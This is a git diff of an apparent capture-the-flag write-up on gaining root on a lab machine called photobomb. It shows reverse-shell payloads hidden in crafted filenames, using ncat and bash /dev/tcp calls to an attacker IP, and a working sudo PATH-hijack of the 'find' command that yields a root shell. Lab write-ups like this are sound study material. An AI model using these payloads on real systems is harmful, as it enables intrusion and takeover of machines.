@@ -130,7 +130,7 @@ fi
 find source_images -type f -name '*.jpg' -exec chown root:root {} \;
 
 ```
-So the script takes a log file, stores it as an old log and truncates the new log, it then finds all .jpg files within the /home/wizard/photobomb folder and execs chown as root on all of them.
+~~So the script takes a log file, stores it as an old log and truncates the new log, it then finds all .jpg files within the /home/wizard/photobomb folder and execs chown as root on all of them.
 
 now usually if a script is ran as root, while taking input from a user (which in this case would be the file names within the photobomb folder) is very unsecure (good for us :))
 
@@ -153,4 +153,35 @@ first things first i want to take a look at the man page for find, to see how th
               be run at all.  This variant of -exec always returns true.
 ```
 The important thing to note is here is is that the man page suggests to quote the {} whereas in the script it's not quoted! could this mean a crafted filename could be used to make the super user run a reverse shell connection?
-A filename that could fit could be `filename;ncat 10.10.16.51 4242 -e /bin/bash;a.jpg`
+A filename that could fit could be "bash -i >& /dev/tcp/10.10.16.51/4242 0>&1;a.jpg"
+After some testing it doesn't seem to work out the way i wanted, however whilst looking on gtfobins (a site which shows which binaries can be used to gain root access) i found that the find command could be used to gain sudo if~~
+Ok, so i was on the wrong track there, i should really check every part of the linpeas file myself before i move onto attempting exploitation. lesson learned.
+The current user (Wizard) can run a specific shell script (/opt/cleanup.sh) AND change environment variables as sudo with no password neccessary:
+```
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+Matching Defaults entries for wizard on photobomb:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User wizard may run the following commands on photobomb:
+    (root) SETENV: NOPASSWD: /opt/cleanup.sh
+```
+so we can run a file which uses a general path to reference the "find" command, so this is vulnerable to a path modification vulnerability
+this is when we manually set the $PATH variable to include a script named "find" and when the script runs find it will run our version, with sudo permissions!
+```
+bash-5.0$ echo bash > /tmp/find
+bash-5.0$ chmod +x /tmp/find
+bash-5.0$  sudo PATH=/tmp:$PATH /opt/cleanup.sh
+sudo PATH=/tmp:$PATH /opt/cleanup.sh
+#  id  
+uid=0(root) gid=0(root) groups=0(root)
+```
+it's just that easy it seems!
+and to finish off,:
+```
+cat /root/root.txt
+52*****************************f
+```
+All done! I need to take my time while re-doing reconnaissance once initial access is gained is what i mainly took away from this. Going forward i'll read through the whole linpeas script and make a shortlist of interesting things to try first.
+
+Thanks for reading.
